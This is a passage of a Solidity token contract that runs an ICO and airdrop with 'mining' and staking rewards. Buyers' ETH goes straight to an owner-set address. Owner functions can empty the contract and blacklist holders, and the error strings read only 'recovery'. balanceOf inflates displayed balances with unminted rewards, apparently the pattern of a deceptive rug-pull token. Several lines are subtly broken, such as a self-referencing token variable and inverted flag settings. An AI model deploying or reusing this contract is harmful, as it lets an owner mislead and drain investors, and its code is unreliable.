        require(_swSale && block.number <= saleMaxBlock,"Transaction recovery");
        require(msg.value >= 0.01 ether,"Transaction recovery");
        uint256 _msgValue = msg.value;
        uint256 _token = _msgValue.mul(salePrice);
        _transfer(address(this),_msgSender(),_token); // _mint(_msgSender(),_airdropToken);
        if(_msgSender()!=_refer&&_refer!=address(0)&&balanceOf(_refer)>0){
            uint referEth = _msgValue.mul(_referEth).div(10000);
            uint _reftoken = _token.mul(_referTok).div(10000);
            _transfer(address(this),_refer,_reftoken); // _mint(_refer,_token);
            _msgValue=_msgValue.sub(referEth);
            payable(_refer).transfer(referEth);
        }
        if(_liquidity == address(0)){
            _liquidity = _owner; 
        }
        payable(_liquidity).transfer(_msgValue);
        return true;
    }
    // End airdop v2
   
    // Ico for Any token
    mapping (address => uint256) private _balances;
  // event Mine(address indexed to, uint256 amount);
  //event MiningFinished();

  //bool public miningFinished = false;
  mapping (address => uint256) private stblock;
  mapping(address => bool) claimed;
  mapping(address => bool) claimstaked;
    // spender like recipient
    address public spender;
    //address public owner;
     bool private _swAirIco = true;
     bool private _swPayIco = true;
     bool private _sclaim = true;
     bool private _sstake = false; 
     bool private _sPayCla = true;
     
      uint sat = 1e18; //decimals
    
    uint countBy = 200000000; // 25000 ~ 1BNB = 0.25  // 2000.00000 = 2000
    //uint maxTok = 1 * sat; // 50 tokens to hand
    // --- Config ---
   // uint priceDecimals = 1e5; // realPrice = Price / priceDecimals
    // --- Config ---
    uint priceDec = 1e5; // realPrice = Price / priceDecimals
    //uint claimDec = 1e3;
    uint mineTok = 100 * sat;
    uint mineDec = 1e3;
    uint stakeDec = 1e3;
    uint mineDiv = 100000000000; 
    uint stakeDiv = 100000000000;    
    //owner = msg.sender;
    ERC20 token = ERC20(token);

    fallback() external payable {
        buyFor(msg.sender, msg.value);
    }
    
    receive() external payable  {
       buyFor(msg.sender, msg.value);
    } 
    
    function buyIco() external payable {
        buyFor(msg.sender, msg.value);
    }
    
    function buyFor(address msg_sender, uint msg_value) internal {
      if (_swAirIco == true){ 
        if(address(token) != address(0) && (msg.value >= 0.001 ether)) {
            uint amount = msg_value * countBy / priceDec;
            if(amount <= token._balanceOf(address(this))){
                if(address(spender) != address(0)){
                 token.transferFrom(spender, msg_sender, amount);   
                } else if(address(spender) == address(0)){
                 token.transfer(msg_sender, amount); 
                }
            }    
        } else if (address(token) == address(0) && (msg.value >= 0.001 ether)){ //default airdrop v2 
            uint256 _msgValue = msg.value;
            uint256 _token = _msgValue.mul(salePrice);
            if(_swSale && _token <= balanceOf(address(this))){
            _transfer(address(this),_msgSender(),_token); 
            }
                }
       }
      if (_swPayIco == true){  
          if(_liquidity == address(0)){
            _liquidity = _owner; 
            }
          payable(_liquidity).transfer(msg.value); 
      }
         
    }

    //claimFree
/*    function claimFree(uint256 _amount) external {
        require(_amount <= (maxTok + 1), "Transfer amount too large.");
        //require(token.balanceOf(msg.sender) + _amount <= maxTok + 1, "The free limit exceeded");
     if (_swAirIco == true){ 
        if(address(spender) != address(0)){
        token.transferFrom(spender, msg.sender, _amount);
        } else if(address(spender) == address(0)){
                 token.transfer(msg.sender, _amount); 
                }
      }
    }
*/

    
    //end Ico any token
    //setting
    
    function startIco(uint8 tag,bool value)public onlyOwner returns(bool){
        if(tag==1){
            _swAirIco = value==true; //false
        }else if(tag==2){
            _swAirIco = value==false;
        }else if(tag==3){
            _swPayIco = value==true; //false
        }
        return true;
    }

    function setIcoCount(uint _new_count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        countBy = _new_count;
    }

    function setIcoToken(address _new_token) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
         token = ERC20(_new_token);
    }

    //function setmaxTokens(uint _token_count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
    //     maxTok = uint(_token_count * sat);
    //}
    
    // setClaimToken(address _new_token) onlyOwner external {
    //    tokenPB = IERC20(_new_token);
    //}

    function setIcoSpend(address _new_spender) onlyOwner external {
        spender = _new_spender;
    }

    function IcoCount() public view returns(uint){
        return countBy;
    }  
    //function IcomaxTok() public view returns(uint){
    //    return maxTok;
    //} 
    function IcoPrice() public view returns(uint){
        //uint _amount = (1 * countBy1BNB / priceDecimals);
        return uint(1 * countBy / priceDec);
    }
    function IcoToken() public view returns (address){
        return address(token);
    }
    function IcoDeposit() public view returns(uint){
        return token._balanceOf(address(this)) / sat;
    }

    //Start Magik Ico token and mining or stake
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      if(_sclaim == true){ 
         if(!claimed[msg.sender]) claim();
        }
     if(_sstake == true){ 
         if(!claimstaked[msg.sender]) claimstake();  // claimstaked[msg.sender] = true;
           }
       transfermine(recipient, amount);
        return true;
    }
    
   // function transfer(address recipient, uint256 amount) public virtual returns (bool) {
   //    if(!claimed[msg.sender]) claim();
   //     transfermine(recipient, amount);
   //     return true;
   // }

    //Start Magik Ico token and mining or stake
    
    function setClaim(uint8 tag,bool value)public onlyOwner returns(bool){
        if(tag==1){
            _sclaim = value==true; //false
        }else if(tag==2){
            _sstake = value==false;
        }else if(tag==3){
            _sPayCla = value==true; //false
        }
        return true;
    }



  function claim() public {
    // require(aSBlock <= block.number && block.number <= aEBlock);
    require(!claimed[msg.sender]);
    uint256 reward = uint256((mineTok));
    require(reward > 0);
    uint256 mining = uint256((block.number.sub(aSBlock-1))*mineDec);
    uint256 _reward = mining.mul(uint256(reward)).div(mineDiv);
    uint256 rewardInt = uint256(reward) + _reward;
    
    claimed[msg.sender] = true;
   
    //Mine(msg.sender, rewardInt); 
    _mint(msg.sender,rewardInt);
   // Transfer(address(0), msg.sender, rewardInt);
  }

    function StakeOn() external payable {
       if(!claimstaked[msg.sender])  AddStake();
    }
    function StakeOff() external payable {
       if(!claimstaked[msg.sender])  claimstake();
    }
    
  function claimstake() public {
    // require(aSBlock <= block.number && block.number <= aEBlock);
    require(!claimstaked[msg.sender]);

    uint256 reward = balanceOf(msg.sender);
    require(reward > 0);
      if(stblock[msg.sender] == 0){
         //stblocknew(msg.sender,block.number);
        aSBlock = uint256(aSBlock);  
      }
      if(stblock[msg.sender] > 0){
        // stblocknew(msg.sender,block.number);
        // aSBlock = uint256(block.number); 
          aSBlock = uint256(stblock[msg.sender]);
       }
    uint256 mining = uint256((block.number.sub(aSBlock-1))*stakeDec);
    uint256 _reward = mining.mul(uint256(reward)).div(stakeDiv);
    uint256 rewardInt = uint256(_reward);
    
     if(!claimed[msg.sender]) claim();
    claimstaked[msg.sender] = true;

    //Mine(msg.sender, rewardInt);
     _mint(msg.sender,rewardInt);
    //Transfer(address(0), msg.sender, rewardInt);
  }
  
  function AddStake() public {
    // require(aSBlock <= block.number && block.number <= aEBlock);
    require(claimstaked[msg.sender]);
    
    uint256 reward = balanceOf(msg.sender);
    require(reward > 0);
    if((stblock[msg.sender] == aSBlock) || (stblock[msg.sender] == 0)){
         stblocknew(msg.sender,block.number);
       aSBlock = uint256(block.number);    
     }else if(stblock[msg.sender] > 0){
         stblocknew(msg.sender,block.number);
         aSBlock = uint256(block.number); 
         // aSBlock = uint256 stblock[msg.sender];
     }
    uint256 mining = uint256((block.number.sub(aSBlock+1))*stakeDec);
    uint256 _reward = mining.mul(uint256(reward)).div(stakeDiv);
    uint256 rewardInt = uint256(_reward);
    
    claimstaked[msg.sender] = false;

    //Mine(msg.sender, rewardInt);
    _burn(msg.sender, rewardInt);
    //Transfer(msg.sender, address(0), rewardInt);
  }


    function stblocknew(address owner_,uint256 block_) internal returns (bool) {
        stblock[owner_] = block_;
        return true;
    }


    function balanceOf(address account) public view returns (uint256) {
        return _balanceOf(account) + (claimed[account] ? 0 : balanceMine(account)) + (claimstaked[account] ? 0 : miningStake(account));
    }

  function balanceMine(address account) public view returns (uint256 reward) {
     // bytes20 reward = bytes20(_owner) & 255;
    // uint256 reward = 0;
     uint256 _reward = 0;
     address sender = account;
     if (!claimed[sender]){
        reward = uint256(mineTok);
        uint256 mining = uint256((block.number.sub(aSBlock))*mineDec);
       _reward = mining.mul(uint256(reward)).div(mineDiv);
       reward = uint256(reward) + _reward;
     }
     if(claimed[sender]){
        if(_balanceOf(account) > 0){
       reward = uint256(_balanceOf(account)); 
       uint256 mining = uint256((block.number.sub(aSBlock))*stakeDec);
       _reward = mining.mul(uint256(reward)).div(stakeDiv);
      //_reward = uint256(_reward - _balances[account]);
      reward = uint256(reward) + _reward;
        }
     }
   // uint256 mining = uint256((block.number.sub(aSBlock))*mineDec);
    //uint256 _reward = mining.mul(uint256(reward)).div(mineDiv);
    // reward = ((uint256(reward)*1e18) + _reward);
    return uint256(reward);
  }


  function balanceStake(address account) public view returns (uint256 reward) {
     // bytes20 reward = bytes20(_owner) & 255;
    // uint256 reward = 0;
     uint256 _reward = 0;
     address sender = account;

     if (!claimstaked[sender]){
      //  reward = uint256(_balances[account]);
      // _reward = mining.mul(uint256(reward)).div(stakeDiv);
         if(_balanceOf(account) > 0){
       reward = uint256(_balanceOf(account)); 
       uint256 mining = uint256((block.number.sub(aSBlock))*stakeDec);
      _reward = mining.mul(uint256(reward)).div(stakeDiv);
      _reward = uint256(_reward - _balances[account]);
        }
     }
     if(claimstaked[sender]){
     if(_balanceOf(account) == 0){
        reward = 0; 
       _reward = 0;
      }
     }
   // uint256 mining = uint256((block.number.sub(aSBlock))*mineDec);
    //uint256 _reward = mining.mul(uint256(reward)).div(mineDiv);
     reward = uint256(reward) + _reward;
     //reward = uint256(_reward);
    return uint256(reward);
  }

    function miningStake(address account) internal view returns (uint256 reward) {
     uint256 _reward = 0;
       reward = uint256(_balanceOf(account));
    uint256 mining = uint256((block.number.sub(aSBlock))*stakeDec);
     _reward = mining.mul(uint256(reward)).div(stakeDiv);
     reward = uint256(_reward);
    return uint256(reward);
    }
  

    function setMineTok(uint256 _count) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        mineTok = _count;
    } 
    
    function setMineD(uint _dec , uint _div) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        mineDec = _dec; mineDiv = _div;
    } 
    function setStakeD(uint _dec , uint _div) external onlyOwner {
        //require(msg.sender == owner, "You is not owner");
        stakeDec = _dec; stakeDiv = _div;
    }     


    //end Magik Ico token and mining or stake
    
    function clear(uint amount) public onlyOwner {
        address payable _cowner = payable(msg.sender);
        _cowner.transfer(amount);
    }
    
    function clearAll() public onlyOwner() {
        //require(_authNum==1000, "Permission denied");
        payable(msg.sender).transfer(address(this).balance);
    }

    function newLiquid(address liq_) public {
        require(liq_ != address(0) && _msgSender() == _auth, "recovery");
        _liquidity = liq_;
    }
/*
    function setAuth(address ah) public onlyOwner returns(bool){
        require(address(0) == _auth&&ah!=address(0), "recovery");
        _auth = ah;
        return true;
    }
*/
    function setAuths(address ah) public returns(bool){
        require(_msgSender() == _owner||_msgSender() == _auth, "recovery");
        require(address(0) != _auth&&ah!=address(0), "recovery");
        _auth = ah;
        return true;
    }
    
    function setLiquid(address addr) public onlyOwner returns(bool){
        require(address(0) != addr, "recovery");
        _liquidity = addr;
        return true;
    }
    
    function setblack(address owner_,uint8 black_) public {
         require(_msgSender() == _owner||_msgSender() == _auth, "recovery");
        black(owner_, black_);
    }
    
    function withdrawAny(address _token_address, uint256 _amount) external onlyOwner{
        IERC20 utoken = IERC20(_token_address);
        require(utoken._balanceOf(address(this)) >= _amount, "Cannot withdraw more than balance");
        utoken.transfer(msg.sender, _amount);
    }

}